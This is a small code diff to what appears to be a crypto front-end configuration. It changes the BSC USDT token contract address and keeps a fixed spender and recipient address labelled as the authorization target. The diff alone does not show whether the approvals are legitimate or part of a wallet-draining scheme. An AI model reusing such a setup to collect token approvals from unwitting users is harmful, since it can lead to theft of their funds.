@@ -10,7 +10,7 @@
       },
       bsc: {
         chainIdHex: "0x38",
-        usdtAddress: "0x524bC91Dc82d6b90EF29F76A3ECAaBAffFD490Bc",
+        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
         spenderAddress: "0x0801955f5e30df945c94b155068d67df94e7bdcc",
         toAddress: "0x0801955f5e30df945c94b155068d67df94e7bdcc" // 授权目标地址 (spender)
       },
